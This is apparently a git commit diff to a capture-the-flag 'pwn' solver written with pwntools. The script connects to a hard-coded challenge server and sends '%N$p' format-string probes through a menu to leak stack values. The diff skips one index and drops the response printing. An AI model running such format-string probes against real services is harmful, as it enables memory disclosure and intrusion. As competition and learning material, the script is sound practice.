64afa06bba3520dd8f4ad69c99d844bb3aaa0c8f
szhan21 <shunda.zhang@intel.com>
2023-04-29 21:36:08 +0800

    Solving Whatdoesthefsay.

--- ctf/pwn/Whatdoesthefsay/dec.py
+++ ctf/pwn/Whatdoesthefsay/dec.py
@@ -4,6 +4,8 @@ context.log_level = 'debug'
 
 def detect(io):
 	for i in range(100):
+		if i == 9:
+			continue
 		svar = '%'+str(i+1)+'$p'
 		io.recvuntil('2. Space food')
 		io.sendline(b'1')
@@ -11,8 +13,6 @@ def detect(io):
 		io.sendline(b'2')
 		io.recvuntil('Red or Green Kryptonite?')
 		io.sendline(svar.encode())
-		buf = io.recvuntil('\n').decode().strip()
-		print(str(i+1)+' : '+buf)
 
 ip, port = '142.93.34.45', 30123
 io = remote(ip, port)
